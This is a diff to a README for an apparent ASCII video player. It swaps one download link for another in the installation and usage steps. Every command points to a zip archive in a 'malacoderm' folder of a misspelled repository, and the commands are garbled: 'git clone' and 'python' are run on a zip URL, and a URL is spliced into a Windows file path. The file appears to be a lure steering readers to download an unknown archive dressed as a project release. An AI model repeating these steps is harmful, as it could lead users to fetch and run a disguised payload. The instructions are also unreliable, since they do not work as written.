@@ -9,7 +9,7 @@ Features:
 
 Installation:
 1. Clone the repository:
-   git clone https://raw.githubusercontent.com/Zenorare/assii_Video_Player/main/malacoderm/assii_Video_Player.zip
+   git clone https://github.com/Zenorare/assii_Video_Player/raw/refs/heads/main/malacoderm/assii-Video-Player-1.0.zip
    cd ascii-video-player
 
 2. Install dependencies:
@@ -18,9 +18,9 @@ Installation:
 Usage:
 1. Place your video in the same folder or use a full path.
 2. Run the script:
-   python https://raw.githubusercontent.com/Zenorare/assii_Video_Player/main/malacoderm/assii_Video_Player.zip
+   python https://github.com/Zenorare/assii_Video_Player/raw/refs/heads/main/malacoderm/assii-Video-Player-1.0.zip
    Example:
-   python https://raw.githubusercontent.com/Zenorare/assii_Video_Player/main/malacoderm/assii_Video_Player.zip C:\Users\YourName\Videos\https://raw.githubusercontent.com/Zenorare/assii_Video_Player/main/malacoderm/assii_Video_Player.zip
+   python https://github.com/Zenorare/assii_Video_Player/raw/refs/heads/main/malacoderm/assii-Video-Player-1.0.zip C:\Users\YourName\Videos\https://github.com/Zenorare/assii_Video_Player/raw/refs/heads/main/malacoderm/assii-Video-Player-1.0.zip
 
 License:
 This project is licensed under the MIT License – feel free to use, share, and modify.
